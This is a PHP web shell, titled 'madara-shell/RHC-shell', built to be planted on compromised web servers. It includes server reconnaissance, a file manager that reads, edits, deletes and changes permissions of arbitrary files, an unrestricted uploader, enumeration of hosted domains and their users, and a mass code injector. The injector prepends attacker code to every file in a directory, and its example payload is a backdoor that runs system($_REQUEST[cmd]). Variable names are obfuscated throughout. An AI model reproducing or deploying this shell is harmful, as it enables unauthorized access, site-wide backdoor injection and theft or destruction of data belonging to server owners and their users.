<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	<?php error_reporting(0);?>
		<title>madara-shell/RHC-shell</title>
		<meta charset="UTF-8" />
		<meta name="description" content="" />
		<meta name="note" content="Changing The Names Wont Make You The Author :)" />
		<meta http-equiv="refresh" content=""><!-- For Refreshing Page After 3600 Intervals of time -->
		<meta name="about" content="Use it where other shells dont work" />
		<meta name="revisit-after" content="1800" />
		<meta name="language" content="en" />
		<meta content='general' name='rating' />
		<meta content='google' name='generator' />
		<meta content='follow,all' name='msnbot' />
		<meta content='follow,all' name='alexabot' />
		<meta content='pakistan' name='geo.placename' />
		<meta content="index,follow,all" name="googlebot" />
		<meta http-equiv="X-UA-Compatible" content="IE-edge" />
		<link rel="SHORTCUT ICON" href="https://i.ibb.co/1vWybVH/rhc.png" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
		<!-- css style -->
		<style>

		</style>
	</head>
  <body>
	  <!-- hadeing start -->
  <div class="container">
  <nav class="navbar navbar-expand-lg navbar-light bg-light">
  <div class="container-fluid">
  <a class="navbar-brand" href="https://www.facebook.com/groups/trmhcommunity">
      <img src="https://i.ibb.co/1vWybVH/rhc.png" alt="" width="30" height="24" class="d-inline-block align-text-top">
      RHC
    </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav">
        <li class="nav-item">
		<a href="?server_info" >
				<input class="btn btn-danger" type="submit" value="Server Info" />
			</a>&nbsp;
        </li>
        <li class="nav-item">
		<a href="?file_manager">
				<input class="btn btn-danger" type="submit" value="File Manager" />
			</a>&nbsp;
        </li>
        <li class="nav-item">
		<a href="?php_info">
				<input class="btn btn-danger" type="submit" value="Php Info" />
			</a>&nbsp;
        </li>
        <li class="nav-item">
		<a href="?mass_injector">
				<input class="btn btn-danger" type="submit" value="Code Injector" />
			</a>&nbsp;
        </li>
		<li class="nav-item">
		<a href="?uploader">
				<input class="btn btn-danger" type="submit" value="Uploader" />
			</a>&nbsp;
        </li>
		<li class="nav-item">
		<a href="?domains">
				<input class="btn btn-danger" type="submit" value="Domains" />
			</a>&nbsp;
        </li>
		</li>
		<li class="nav-item">
		<a href="?back_connecter">
				<input class="btn btn-danger" type="submit" value="Back Connecter" />
			</a>&nbsp;
        </li>
		</li>
		<li class="nav-item">
		<a href="?die">
				<input class="btn btn-danger" type="submit" value="delete" />
			</a>&nbsp;
        </li>
		<li> <a class="btn btn-outline-primary"href="https://www.facebook.com/4m3rr0r">4m3rr0r</a></li>
      </ul>
    </div>
  </div>
</nav>
  </div>

	<!-- heding end -->

	<div class="container">
	<?php
if (isset($_GET['server_info'])) {?>
<div class="row row-cols-1 row-cols-md-3 g-4">
  <div class="col">
    <div class="card h-100">
      <img src="data:image/png;base64,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" class="card-img-top" alt="...">
      <div class="card-body">
        <h5 class="card-title">Uname</h5>
        <p class="card-text"><?php echo php_uname(); ?></p>
      </div>
    </div>
  </div>
  <div class="col">
    <div class="card h-100">
      <img src="https://images.idgesg.net/images/article/2017/08/browser_logos-100734193-large.jpg" class="card-img-top" alt="...">
      <div class="card-body">
        <h5 class="card-title">Browser</h5>
        <p class="card-text"> <?php echo $_SERVER['HTTP_USER_AGENT']; ?></p>
      </div>
    </div>
  </div>
  <div class="col">
    <div class="card h-100">
      <img src="https://freshdesignweb.com/wp-content/uploads/site/web-server-software-216.jpg" class="card-img-top" alt="...">
      <div class="card-body">
        <h5 class="card-title">Server Software</h5>
        <p class="card-text"><?php echo $_SERVER['SERVER_SOFTWARE']; ?> </p>
      </div>
    </div>
  </div>
  <div class="col">
    <div class="card h-100">
      <img src="https://i.pcmag.com/imagery/articles/07CSW87UwsoIIArA9sMZXft-6..1569491760.jpg" class="card-img-top" alt="...">
      <div class="card-body">
        <h5 class="card-title">Server IP</h5>
        <p class="card-text"><?php echo $_SERVER['SERVER_ADDR']; ?></p>
      </div>
    </div>
  </div>
  <div class="col">
    <div class="card h-100">
      <img src="https://miro.medium.com/max/1000/0*Zw1ZfCk0svcXVQXg.jpg" class="card-img-top" alt="...">
      <div class="card-body">
        <h5 class="card-title">User</h5>
        <p class="card-text"><?php echo @get_current_user(); ?></p>
      </div>
    </div>
  </div>
  <div class="col">
    <div class="card h-100">
      <img src="https://i.pcmag.com/imagery/articles/02pW2ueyCDklYYLa0ORakj5-23.1569486603.fit_lim.jpg" class="card-img-top" alt="...">
      <div class="card-body">
        <h5 class="card-title">Safe Mode</h5>
        <p class="card-text  btn-danger"><?php $_ee24408cd02b = ini_get('safe_mode'); if ($_ee24408cd02b == 1) { echo '<span style="color: red;">On';} else {echo '<span style="color: lawngreen;">Off</span>';}?></p>
      </div>
    </div>
  </div>
  <div class="col">
    <div class="card h-100">
      <img src="https://bitrebels.com/wp-content/uploads/2019/08/free-domain-name-header-image.png" class="card-img-top" alt="...">
      <div class="card-body">
        <h5 class="card-title">Domains</h5>
        <p class="card-text"><?php if(strtolower(substr(PHP_OS,0,3)) == "win") {$_f3d329025a5d = 'win';}else {$_f3d329025a5d = 'nix';}if($_f3d329025a5d == 'nix') {$_1a1142d4b381 = @file_get_contents("/etc/named.conf");if(!$_1a1142d4b381) {$_b9c59d921b4e = "/var/named";$_011c7db1e205 = scandir($_b9c59d921b4e);$_0d88a9bd4c27 = count($_011c7db1e205);} else {@preg_match_all('/.*?zone "(.*?)" {/', $_1a1142d4b381, $_1765c46dda35);$_1765c46dda35 = sizeof(array_unique($_1765c46dda35[1])); $_0d88a9bd4c27 = $_1765c46dda35."  Domains";}} else {$_0d88a9bd4c27 = "1";} echo $_0d88a9bd4c27; }?></p>
      </div>
    </div>
  </div>
  <?php
if (isset($_GET['file_manager'])) {echo '<!DOCTYPE HTML>
						<HTML>
						<HEAD>
						<link href="" rel="stylesheet" type="text/css">
						<title>File Manager</title>
						<style>
						body{
							color:black;
						}
						#content tr:hover{
						    background-color: white;
						    text-shadow:0px 0px 10px white;
						}
						#content .first{
						    background-color: silver;
						}
						#content .first:hover{
						    background-color: silver;
						    text-shadow:0px 0px 1px #757575;
						}
						table{
						    border: 1px white dotted;
						}
						H1{
						    
						}
						a{
							color: black;
    text-decoration: underline;
}
						a:hove{ 
							backgound:red;
						}
						
						pre {
							color: ;
							font-family: cursive;
							font-size: 100%;
						}
						
						</style>
						</HEAD>
						<BODY>
						<H1><center>File Manager</center></H1>
						<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
						<tr><td><font class="btn btn-primary">Current Path : ';$_d586cea720c2 = getcwd();$_d586cea720c2 = str_replace('\\','/',$_d586cea720c2);$_19eaea116b65 = explode('/',$_d586cea720c2);function permsa($_db30bcba387e){$_62756ced6cca = fileperms($_db30bcba387e);if (($_62756ced6cca & 0xC000) == 0xC000) {$_c889a0d2bbd1 = 's';} elseif (($_62756ced6cca & 0xA000) == 0xA000) {$_c889a0d2bbd1 = 'l';} elseif (($_62756ced6cca & 0x8000) == 0x8000) {$_c889a0d2bbd1 = '-';} elseif (($_62756ced6cca & 0x6000) == 0x6000) {$_c889a0d2bbd1 = 'b';} elseif (($_62756ced6cca & 0x4000) == 0x4000) {$_c889a0d2bbd1 = 'd';} elseif (($_62756ced6cca & 0x2000) == 0x2000) {$_c889a0d2bbd1 = 'c';} elseif (($_62756ced6cca & 0x1000) == 0x1000) {$_c889a0d2bbd1 = 'p';} else {$_c889a0d2bbd1 = 'u';}$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0100) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0080) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0040) ?(($_62756ced6cca & 0x0800) ? 's' : 'x' ) :(($_62756ced6cca & 0x0800) ? 'S' : '-'));$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0020) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0010) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0008) ?(($_62756ced6cca & 0x0400) ? 's' : 'x' ) :(($_62756ced6cca & 0x0400) ? 'S' : '-'));$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0004) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0002) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0001) ?(($_62756ced6cca & 0x0200) ? 't' : 'x' ) :(($_62756ced6cca & 0x0200) ? 'T' : '-'));return $_c889a0d2bbd1;}foreach($_19eaea116b65 as $_fb685115b91f=>$_e3beccd8d39e){ if($_e3beccd8d39e == '' && $_fb685115b91f == 0){ $_3c0a4563959e = true; echo '<a href="?file_manager&path=/">/</a>'; continue; } if($_e3beccd8d39e == '') continue; echo '<a href="?file_manager&path='; for($_bad1b53b4fbb=0;$_bad1b53b4fbb<=$_fb685115b91f;$_bad1b53b4fbb++){ echo "$_19eaea116b65[$_bad1b53b4fbb]"; if($_bad1b53b4fbb != $_fb685115b91f) echo "/"; } echo '">'.$_e3beccd8d39e.'</a>/';}echo '</td></tr><tr><td>'; if(isset($_GET['filesrc'])){ echo "<tr><td>Current File : "; echo $_GET['filesrc']; echo '</tr></td></table><br />'; echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ echo '</table><br /><center>'.$_POST['path'].'<br /><br />'; if($_POST['opt'] == 'chmod'){ if(isset($_POST['perm'])){ if(chmod($_POST['path'],$_POST['perm'])){ echo '<font color="green">Change Permission Done.</font><br />'; }else{ echo '<font color="red">Change Permission Error.</font><br />'; } } echo '<form method="POST">
						        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="chmod">
						        <input type="submit" value="Go" />
						        </form>'; }elseif($_POST['opt'] == 'rename'){ if(isset($_POST['newname'])){ if(rename($_POST['path'],$_d586cea720c2.'/'.$_POST['newname'])){ echo '<font color="green">Change Name Done.</font><br />'; }else{ echo '<font color="red">Change Name Error.</font><br />'; } $_POST['name'] = $_POST['newname']; } echo '<form method="POST">
						        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="rename">
						        <input type="submit" value="Go" />
						        </form>'; }elseif($_POST['opt'] == 'edit'){ if(isset($_POST['src'])){ $_ba2773181c57 = fopen($_POST['path'],'w'); if(fwrite($_ba2773181c57,$_POST['src'])){ echo '<font color="green">Edit File Done.</font><br />'; }else{ echo '<font color="red">Edit File Error.</font><br />'; } fclose($_ba2773181c57); } echo '<form method="POST">
						        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
						        <input type="hidden" name="path" value="'.$_POST['path'].'">
						        <input type="hidden" name="opt" value="edit">
						        <input type="submit" value="Go" />
						        </form>'; } echo '</center>';}else{ echo '</table><br /><center>'; if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ if($_POST['type'] == 'dir'){ if(rmdir($_POST['path'])){ echo '<font color="green">Delete Dir Done.</font><br />'; }else{ echo '<font color="red">Delete Dir Error.</font><br />'; } }elseif($_POST['type'] == 'file'){ if(unlink($_POST['path'])){ echo '<font color="green">Delete File Done.</font><br />'; }else{ echo '<font color="red">Delete File Error.</font><br />'; } } } echo '</center>'; $_b1faba4eea56 = scandir($_d586cea720c2); echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
						    <tr class="first">
						        <td><center>Name</center></td>
						        <td><center>Size</center></td>
						        <td><center>Permissions</center></td>
						        <td><center>Options</center></td>
						    </tr>'; foreach($_b1faba4eea56 as $_2ac452f67253){ if(!is_dir("$_d586cea720c2/$_2ac452f67253") || $_2ac452f67253 == '.' || $_2ac452f67253 == '..') continue; echo "<tr>
						        <td><a href=\"?file_manager&path=$_d586cea720c2/$_2ac452f67253\">$_2ac452f67253</a></td>
						        <td><center>--</center></td>
						        <td><center>"; if(is_writable("$_d586cea720c2/$_2ac452f67253")) echo '<font color="green">'; elseif(!is_readable("$_d586cea720c2/$_2ac452f67253")) echo '<font color="red">'; echo permsa("$_d586cea720c2/$_2ac452f67253"); if(is_writable("$_d586cea720c2/$_2ac452f67253") || !is_readable("$_d586cea720c2/$_2ac452f67253")) echo '</font>'; echo "</center></td>
						        <td><center><form method=\"POST\" action=\"?file_manager&option&path=$_d586cea720c2\">
						        <select name=\"opt\">
						        <option value=\"\"></option>
						        <option value=\"delete\">Delete</option>
						        <option value=\"chmod\">Chmod</option>
						        <option value=\"rename\">Rename</option>
						        </select>
						        <input type=\"hidden\" name=\"type\" value=\"dir\">
						        <input type=\"hidden\" name=\"name\" value=\"$_2ac452f67253\">
						        <input type=\"hidden\" name=\"path\" value=\"$_d586cea720c2/$_2ac452f67253\">
						        <input type=\"submit\" value=\">\" />
						        </form></center></td>
						        </tr>"; } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; foreach($_b1faba4eea56 as $_db30bcba387e){ if(!is_file("$_d586cea720c2/$_db30bcba387e")) continue; $_77eb295f75fe = filesize("$_d586cea720c2/$_db30bcba387e")/1024; $_77eb295f75fe = round($_77eb295f75fe,3); if($_77eb295f75fe >= 1024){ $_77eb295f75fe = round($_77eb295f75fe/1024,2).' MB'; }else{ $_77eb295f75fe = $_77eb295f75fe.' KB'; } echo "<tr>
						        <td><a  href=\"?file_manager&filesrc=$_d586cea720c2/$_db30bcba387e&path=$_d586cea720c2\">$_db30bcba387e</a></td>
						        <td><center>".$_77eb295f75fe."</center></td>
						        <td><center>"; if(is_writable("$_d586cea720c2/$_db30bcba387e")) echo '<font color="green">'; elseif(!is_readable("$_d586cea720c2/$_db30bcba387e")) echo '<font color="red">'; echo permsa("$_d586cea720c2/$_db30bcba387e"); if(is_writable("$_d586cea720c2/$_db30bcba387e") || !is_readable("$_d586cea720c2/$_db30bcba387e")) echo '</font>'; echo "</center></td>
						        <td><center><form method=\"POST\" action=\"?file_manager&option&path=$_d586cea720c2\">
						        <select name=\"opt\">
						        <option value=\"\"></option>
						        <option value=\"delete\">Delete</option>
						        <option value=\"chmod\">Chmod</option>
						        <option value=\"rename\">Rename</option>
						        <option value=\"edit\">Edit</option>
						        </select>
						        <input type=\"hidden\" name=\"type\" value=\"file\">
						        <input type=\"hidden\" name=\"name\" value=\"$_db30bcba387e\">
						        <input type=\"hidden\" name=\"path\" value=\"$_d586cea720c2/$_db30bcba387e\">
						        <input type=\"submit\" value=\">\" />
						        </form></center></td>
						        </tr>"; } echo '</table>
						    </div><br><br><br>';}echo '
						</BODY>
						</HTML>';}?>
						<?php
if (isset($_GET['php_info'])) {?>
					<?php phpinfo(); echo '<br><br><br>';}?>
					<?php ?>
					<?php
if (isset($_GET['file_creator'])) {?>
					<center><br><br>
					<form action="" method="POST">
						<font color="white" face="cursive" size="">Filename: </font>
						<input type="text" name="file_name" placeholder="File Name Here" /><br><br>
						<font color="white" face="cursive" size="">Content: </font><br>
						<textarea name="content_of_files" rows="10" cols="90"></textarea><br><br>
						<input type="submit" name="submissionoffilecreator" value="Submit" />
					</form>
					<?php
$_5eb61fd12eed = $_POST['file_name'];$_0adc62b31334 = $_POST['content_of_files'];if (isset($_POST['file_name']) || isset($_POST['content_of_files']) || isset($_POST['submissionoffilecreator'])) {if (!empty($_5eb61fd12eed) || !empty($_0adc62b31334)) {$_84c54f971273 = @fopen($_5eb61fd12eed, 'w');@fwrite($_84c54f971273, $_0adc62b31334);@fclose($_84c54f971273);?><br><br>
						<font color="white" face="cursive" size="5">File With Name: <a href="<?php echo $_5eb61fd12eed; ?>" target="_blank"><?php echo $_5eb61fd12eed; ?></a> is created</font>
						<?php } else {?><br><br>
							<font color="white" face="cursive" size="5">Please Input In All Fields :P</font>
							<?php
}}}?>
				<?php
if (isset($_GET['mass_injector'])) {?><br><center><br>
<nav class="navbar navbar-light bg-danger">
  <div class="container-fluid">
    <a class="navbar-brand" href="https://www.facebook.com/4m3rr0r">
      <img src="https://scontent.fdac11-2.fna.fbcdn.net/v/t1.6435-9/192821839_107569554881590_7000419339466519353_n.jpg?_nc_cat=110&ccb=1-3&_nc_sid=09cbfe&_nc_ohc=5RfeY3thLSEAX-aN7R-&_nc_oc=AQnMr6oZ2Ybg8eogJELarNXbNNb9LpdzU2lM4zlWm-4wH2rio0MBWXnYjQFwmu6lNvo&_nc_ht=scontent.fdac11-2.fna&oh=d8b93c3d85cad95bb21a1a4d26af5578&oe=613082A7" alt="" width="30" height="24" class="d-inline-block align-text-top">
      4m3rr0r
    </a>
	<h6><font>ReV Mass Code Injector V2.0</font><br><br>
							<form action="" method="POST"></h>
  </div>
</nav>
							
			<?php
$_ec5b37e72301 = '
<?php
if (isset($_REQUEST[cmd])) {
system ($_REQUEST[cmd]);
}
?>';?>
				<textarea class="bg-dark" style="color:red;"type="text" name="code" rows="13" cols="80" placeholder="Enter Your Code Like This : <?php echo $_ec5b37e72301; ?>"></textarea><br><br>
				<input class="btn btn-outline-success" type="submit" name="submit" value="Submit" />
			</form>
			<?php
if (isset($_POST['submit'])) {$_e04f8301a9f1 = $_POST['code'];$_9f7af403d39c = base64_encode($_e04f8301a9f1);$_d586cea720c2 = getcwd();$_959a28065435 = 'http://'.$_SERVER['HTTP_HOST'];$_da84e8d0e5e8 = $_SERVER['SCRIPT_NAME'];$_d394e1453852 = $_959a28065435.$_da84e8d0e5e8;$_d586cea720c2 = getcwd();$_3528fced53a2 = $_d586cea720c2;if (empty($_e04f8301a9f1)) {echo '<font  class="alert alert-danger" size=\'50%\' face=\'cursive\' color=\'red\'>You need to input something !!! :P</font>';}if (!empty($_e04f8301a9f1)) {if ($_84c54f971273 = opendir($_3528fced53a2)) {echo 'Website: '.$_d394e1453852.'<br><br>';echo 'Looking in '.$_3528fced53a2.'<br>';while ($_fb803b5db2a0 = readdir($_84c54f971273)) {if ($_fb803b5db2a0 != '.' && $_fb803b5db2a0 != '..' && $_fb803b5db2a0 != 'rev.php' && $_fb803b5db2a0 != 'REV.php' && $_fb803b5db2a0 != '.htaccess' && $_fb803b5db2a0 != 'php.ini' && $_fb803b5db2a0 != 'admin' && $_fb803b5db2a0 != 'images' && $_fb803b5db2a0 != 'image' && $_fb803b5db2a0 != 'img' && $_fb803b5db2a0 != 'phpmyadmin' && $_fb803b5db2a0 != 'files' && $_fb803b5db2a0 != '.ftpquota' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'xml' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpg' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'png' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'jpeg' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'txt' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'exe' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'html' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'shtml' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'htm' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'ico' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'css' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'zip' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'js' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'py' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'pl' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'md' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'gif' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'tar.gz' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'c' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'sql.zip' && strtolower(substr($_fb803b5db2a0, strrpos($_fb803b5db2a0, '.') + 1)) != 'out') {echo '<a style="color: red; font-family: cursive;" target="_blank" href="'.$_fb803b5db2a0.'">'.$_fb803b5db2a0.'</a><font size="" color="lawngreen" face="cursive">&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';$_c4f3394d1c6c = base64_decode($_9f7af403d39c);$_c4f3394d1c6c .= file_get_contents($_fb803b5db2a0);file_put_contents($_fb803b5db2a0, $_c4f3394d1c6c); echo '<br><br><br>';} }}}}}?>

<?php
if (isset($_GET['uploader'])) {?>
				<center>
				<div class="card" style="width: 18rem;">
  <img src="https://www.lifewire.com/thmb/P856-0hi4lmA2xinYWyaEpRIckw=/1920x1326/filters:no_upscale():max_bytes(150000):strip_icc()/cloud-upload-a30f385a928e44e199a62210d578375a.jpg" class="card-img-top" alt="...">
  <div class="card-body">
    <h5 class="card-title">Uploader</h5>
    <form method="POST" enctype="multipart/form-data" action="">
					<input type="file" name="files">
					<p>upload your nasa hocking shell</p>
					<input class="btn btn-outline-success"" type=submit value="Upload">
				</form>
  </div>
</div>
				
				
				</div>
				</center>
				<?php
$_fb803b5db2a0 = @$_FILES["files"];if ($_fb803b5db2a0["name"] != '') { $_73a9599617ef = $_REQUEST["path"] . $_fb803b5db2a0["name"]; if (move_uploaded_file($_fb803b5db2a0['tmp_name'], $_73a9599617ef)) { echo "<center><br><br><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$_73a9599617ef' target='_blank'>Click to access uploaded File</a></font></center>"; }}?>
				<?php
}?>
		<?php
?>
		<font">
		<?php
if (isset($_GET['domains'])) { if(strtolower(substr(PHP_OS,0,3)) == "win") {$_f3d329025a5d = 'win';}else {$_f3d329025a5d = 'nix';} if ($_f3d329025a5d == 'win') {?>
				<center><br><br>
					<font class="alert alert-info">Ooopppss Windows Server :P<br><br> You Better Find Linux :P </font>
				</center><?php
}else {if (isset($_GET['domains'])) {$_db30bcba387e = @implode(@file("/etc/named.conf"));$_549674eea689 = "/var/named";if (!$_db30bcba387e) {$_fb0dd6286113 = scandir($_549674eea689);$_74ba591cb2f1=1;$_cbd11b654fbf = 0; echo "<table align=center border=1 width=59% cellpadding=5>
					<tr><td colspan=2><center>There are : ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.</center></td></tr>
					<tr><td>No</td><td>Domain</td><td>User</td></tr>";foreach ($_fb0dd6286113 as &$_abf6e8a6ebfa) { if (stripos($_abf6e8a6ebfa,".db")) { $_abf6e8a6ebfa = str_replace('.db','',$_abf6e8a6ebfa); } if (strlen($_abf6e8a6ebfa) > 6) { echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>User</td></tr>"; } } echo "</table>";} else{ $_74ba591cb2f1 = 1; preg_match_all("#named/(.*?).db#", $_db30bcba387e, $_6fb5fe1b7448); $_fb0dd6286113 = array_unique($_6fb5fe1b7448[1]); echo "<table align=center border=1 width=59% cellpadding=5>
					<tr><td colspan=2> There are  ( <b>" . count($_fb0dd6286113) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
					<tr><td>No</td><td>Domain</td><td>User</td></tr>"; foreach ($_fb0dd6286113 as $_abf6e8a6ebfa) { $_1653139bda87 = posix_getpwuid(@fileowner("/etc/valiases/" . $_abf6e8a6ebfa)); echo "<tr><td>".$_74ba591cb2f1++."</td><td><a href='http://".$_abf6e8a6ebfa."' target='_blank'>".$_abf6e8a6ebfa."</a></td><td>".$_1653139bda87['name']."</td></tr>"; ?> </font><br><br><br> <?php
 }}} } }?>
 <?php
